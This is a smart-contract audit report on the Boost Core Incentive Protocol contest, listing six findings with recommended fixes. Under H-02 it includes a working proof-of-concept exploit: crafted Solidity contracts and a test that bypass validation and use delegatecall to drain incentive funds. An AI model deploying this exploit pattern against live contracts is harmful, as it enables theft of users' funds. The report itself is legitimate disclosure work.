+++
start-date = "2024-9-12"
end-date = "2024-9-15"
total-time = "16h"
author = "0xSolus"
+++

# Sherlock Audit Contest Details 
[Boost Core Incentice Protocol](https://audits.sherlock.xyz/contests/426?filter=questions)  


# Findings Summary

| ID     | Title                                                                                      | Severity 
| ------ | ------------------------------------------------------------------------------------------ | -------- 
| [H-01] | CGDAIncentives::claim() can be drained due to lack of claim validation                     | High     
| [H-02] | Any user that has access to createBoost can drain funds from any budget or any incentives  | High     
| [M-01] | ClaimIncentives() gets locked if boost is created without a validator.                     | Medium    
| [M-02] | Some Incentives methods with onlyOwner access are not callable                             | Medium    
| [M-03] | ERC1155Incentive::initialize() is calling `_initializeOwner()` twice                       | Medium    
| [M-04] | SignerValidator::validate() doesn't implement a nonce value                                | Medium   

# Detailed Findings

## [H-01] - CGDAIncentives::claim() can be drained due to lack of claim validation.
  A user that can claim his incentives in `CGDAIncentives` contract, could drain the 
  funds on the contract by calling `claim()`, an unlimited amount of times as the function
  doesn't flag users that already claimed their incentive. 

  **Recommendation:**
```solidity
  /// @inheritdoc AIncentive
  /// @notice Claim the incentive
  function claim(address claimTarget, bytes calldata) external virtual override onlyOwner returns (bool) {
    if (!_isClaimable(claimTarget)) revert NotClaimable();
    claims++;
    // @audit claims should be flaged.
    claimed[claimTarget] = true;

    // Calculate the current reward and update the state
    uint256 reward = currentReward();
    cgdaParams.lastClaimTime = block.timestamp;
    cgdaParams.currentReward =
      reward > cgdaParams.rewardDecay ? reward - cgdaParams.rewardDecay : cgdaParams.rewardDecay;

    // Transfer the reward to the recipient
    asset.safeTransfer(claimTarget, reward);

    emit Claimed(claimTarget, abi.encodePacked(asset, claimTarget, reward));
    return true;
  }

```

## [H-02] - Any user that has access to createBoost can drain funds from any budget or any incentives. 
Any user authorized to call `BoostCore::createBoost()` can create a crafted boost 
that allows him to drain funds from budgets and incentives through `BoostCore::claimIncentivesFor()`.

If a boost is created with an action that inherits `AValidator` and can make `validate()` to return always 
true bypassing [this line](https://github.com/sherlock-audit/2024-06-boost-aa-wallet-noahfigueras/blob/main/boost-protocol/packages/evm/contracts/BoostCore.sol#L176). 
Then on the following [line](https://github.com/sherlock-audit/2024-06-boost-aa-wallet-noahfigueras/blob/main/boost-protocol/packages/evm/contracts/BoostCore.sol#L177),
the `claim()` can call a crafted function deployed as an incentive that `delegatescall` to other contracts. As 
`msg.sender` will remain as `BoostCore`, all incentives methods under `onlyOwner` are able to be called. 
Specifically, calling `clawback()` will allow someone to drain any incentives methods. Also budgets, 
can be drain as long as `BoostCore` is allowed to call `budget.disburse()` or `budget.clawback()`.

In the following example, a crafted incentive called `ExploitIncentive` is deployed
with the following logic in `claim()`:

```solidity
    /// @notice Claim the incentive
    /// @param claimTarget the address receiving the claim
    /// @return True if the incentive was successfully claimed
    function claim(address claimTarget, bytes calldata _data) external override onlyOwner returns (bool) {
      bytes memory encodedFunctionCall = abi.encodeWithSignature("clawback(bytes)", _data);
      claimTarget.delegatecall(encodedFunctionCall);
      return true;
    }
```

Also, a crafted action is deployed called `ExploitAction` bypassing `validate()`: 
```solidity
contract ExploitAction is AContractAction, AValidator {
    /// @inheritdoc ACloneable
    /// @notice Initialize the contract with the owner and the required data
    function initialize(bytes calldata data_) public virtual override initializer {
        _initialize(abi.decode(data_, (InitPayload)));
    }

    function _initialize(InitPayload memory init_) internal virtual onlyInitializing {
        chainId = init_.chainId;
        target = init_.target;
        selector = init_.selector;
        value = init_.value;
    }
    /// @inheritdoc AContractAction
    function getComponentInterface() public pure virtual override(AContractAction, AValidator) returns (bytes4) {
        return type(AERC721MintAction).interfaceId;
    }

    /// @inheritdoc AContractAction
    function supportsInterface(bytes4 interfaceId)
        public
        view
        virtual
        override(AContractAction, AValidator)
        returns (bool)
    {
        return interfaceId == type(AERC721MintAction).interfaceId || super.supportsInterface(interfaceId);
    }
    function validate(uint256, /*unused*/ uint256, /* unused */ address, /*unused*/ bytes calldata data_)
        external
        virtual
        override
        returns (bool success)
    {
      return true;
    }
}

```

Finally, crafted `boost` is deployed to drain incentives.
```solidity
    function testCreateBoost_ExploitIncentives() public {
    
        BoostLib.Boost memory boost1 = boostCore.createBoost(validCreateCalldata);

        BoostLib.Target[] memory incentives = new BoostLib.Target[](1);
        incentives[0] = BoostLib.Target({
          isBase: true,
          instance: address(new ExploitIncentive()),
          parameters: abi.encode(
            ERC20Incentive.InitPayload({
              asset: address(mockERC20),
              strategy: AERC20Incentive.Strategy.POOL,
              reward: 1 ether,
              limit: 100
            })
          )
        });

        mockERC20.mint(address(this), 100 ether);
        mockERC20.approve(address(budget), 100 ether);
        budget.allocate(
            abi.encode(
                ABudget.Transfer({
                    assetType: ABudget.AssetType.ERC20,
                    asset: address(mockERC20),
                    target: address(this),
                    data: abi.encode(ABudget.FungiblePayload({amount: 100 ether}))
                })
            )
        );

        
        bytes memory createData = LibZip.cdCompress(
            abi.encode(
                BoostCore.InitPayload({
                    budget: budget,
                    action: BoostLib.Target({
                          isBase: true,
                          instance: address(new ExploitAction()),
                          parameters: abi.encode(
                              AContractAction.InitPayload({chainId: block.chainid, target: address(0), selector: "", value: 0})
                          )
                    }),
                    validator: BoostLib.Target({isBase: true, instance: address(0), parameters: ""}),
                    allowList: allowList,
                    incentives: incentives,
                    protocolFee: 500, // 5%
                    referralFee: 1000, // 10%
                    maxParticipants: 10_000,
                    owner: address(1)
                })
            )
        );
        BoostLib.Boost memory boost2 = boostCore.createBoost(createData);
      
        bytes memory payload = 
            abi.encode(AIncentive.ClawbackPayload({target: address(2), data: abi.encode(50 ether)}));
        // @audit - Take a look here we use our crafted boost2 to drain boost1.incentives[0]
        // but this could be repeated for budgets as long as BoostCore can call the methods.
        boostCore.claimIncentiveFor{value: 0.000075 ether}(1, 0, address(0), payload , address(boost1.incentives[0]));

    }

```
**Recommendation:**
Consider restricting access to `incentives.clawback()`, `budget.clawback()` and `budget.disburse()`
from `BoostCore` calls and implement a manager role that is allowed to execute those functions. 
Budget implements `accessControls` for a manager role, but incentives 
do not, they are only callable by `onlyOwner` which is `BoostCore` due to initialization. 
Consider adding a manager role for `incentives` that can execute those functions.

## [M-01] - ClaimIncentives() gets locked if boost is created without a validator.
Boosts are allowed to be created without a validator, in this case the address of a 
validator will be `address(0)`. This causes `boostCore::claimIncentives()` to revert
at all times at this [line](https://github.com/sherlock-audit/2024-06-boost-aa-wallet-noahfigueras/blob/main/boost-protocol/packages/evm/contracts/BoostCore.sol#L176)
, causing the incentive to never be able to be claimed. 

**Recomendation**
Consider reverting if a validator is not setup properly. 
```solidity
    function createBoost(bytes calldata data_)
        external
        canCreateBoost(msg.sender)
        nonReentrant
        returns (BoostLib.Boost memory)
    {
        InitPayload memory payload_ = abi.decode(data_.cdDecompress(), (InitPayload));

        // Validate the Budget
        _checkBudget(payload_.budget);

        // Initialize the Boost
        BoostLib.Boost storage boost = _boosts.push();
        boost.owner = payload_.owner;
        boost.budget = payload_.budget;
        boost.protocolFee = protocolFee + payload_.protocolFee;
        boost.referralFee = referralFee + payload_.referralFee;
        boost.maxParticipants = payload_.maxParticipants;

        // Setup the Boost components
        boost.action = AAction(_makeTarget(type(AAction).interfaceId, payload_.action, true));
        boost.allowList = AAllowList(_makeTarget(type(AAllowList).interfaceId, payload_.allowList, true));
        boost.incentives = _makeIncentives(payload_.incentives, payload_.budget);
        // @audit - Validator can become address(0), that can cause DOS in claimIncentive 
        // always reverting
        boost.validator = AValidator(
            payload_.validator.instance == address(0)
                ? boost.action.supportsInterface(type(AValidator).interfaceId) ? address(boost.action) : address(0) 
                : _makeTarget(type(AValidator).interfaceId, payload_.validator, true)
        );

        if(address(boost.validator) == address(0)) { revert InvalidValidator(); }

        emit BoostCreated(
            _boosts.length - 1,
            boost.owner,
            address(boost.action),
            boost.incentives.length,
            address(boost.validator),
            address(boost.allowList),
            address(boost.budget)
        );
        return boost;
    }

```

## [M-02] - Some Incentives methods with onlyOwner access are not callable. 
The following methods are not callable as Incentives owner is BoostCore and in some 
instances it doesn't implement logic to call some methods. More specifically: `drawRaffle()` and `clawback()`.

Instances: 
```
ERC1155Incentives::clawback(), CGDAIncentive::clawback(), ERC20Incentive::clawback(), 
EERC20Incentive::drawRaffle(), RC20VariableIncentive::clawback() 
```

**Recommendation**
Consider adding different access controls. For example, a manager role that is able 
to call those functions. 

## [M-03] - ERC1155Incentive::initialize() is calling `_initializeOwner()` twice.
Instances: ERC1155Incentive, ERC20VariableIncentive.

With the current scenario this is just redundant code. The problem arises, if an implementation
of ERC1155Incentive uses `_guardInitializeOwner()` to prevent double-initialization [look here](https://github.com/Vectorized/solady/blob/main/src/auth/Ownable.sol#L100).

The previous scenario will cause the `initialize()` to revert all the time. This is a bigger problem 
as BoostCore calls that initialization [here](https://github.com/sherlock-audit/2024-06-boost-aa-wallet-noahfigueras/blob/main/boost-protocol/packages/evm/contracts/BoostCore.sol#L289)
, therefore it will become impossible to create a Boost with this Incentive. 

I'm including this issue as in their documentation the protocol intends to use 
this Incentives to be able to be extended [here](https://github.com/rabbitholegg/boost-protocol?tab=readme-ov-file#boost-creation).
```solidity
/// @notice Initialize the contract with the incentive parameters
/// @param data_ The compressed initialization payload
function initialize(bytes calldata data_) public override initializer {
  _initializeOwner(msg.sender);
  InitPayload memory init_ = abi.decode(data_, (InitPayload));

  // Ensure the strategy is valid (MINT is not yet supported)
  if (init_.strategy == Strategy.MINT) revert BoostError.NotImplemented();
  if (init_.limit == 0) revert BoostError.InvalidInitialization();

  // Ensure the maximum reward amount has been allocated
  uint256 available = init_.asset.balanceOf(address(this), init_.tokenId);
  if (available < init_.limit) {
    revert BoostError.InsufficientFunds(address(init_.asset), available, init_.limit);
  }

  asset = init_.asset;
  strategy = init_.strategy;
  tokenId = init_.tokenId;
  limit = init_.limit;
  extraData = init_.extraData;

  // @audit Consider removing the following line as it becomes redundant and 
  // can cause future problems if _guardInitializeOwner() is set to true.
  //_initializeOwner(msg.sender);
}
```

## [M-04] - SignerValidator::validate() doesn't implement a nonce value.
The problem arises, if a `claimant` needs to claim an incentive more than once, which can 
happen. For example, `ERC20VariableIncentive` incentives are claimable as long as `totalClaim < limit`.
Also, as incentives are supposed to be extendable other incentives might be created
with the purpose of multi claims. In this scenario, this implementation will always 
revert with `IncentiveClaimed` if a user needs to claim the rewards more than once 
for an `incentiveId`.

**Recommendation:**
Consider implementing a nonce for `claimant` in the signature hash [here](https://github.com/sherlock-audit/2024-06-boost-aa-wallet-noahfigueras/blob/main/boost-protocol/packages/evm/contracts/validators/SignerValidator.sol#L61).
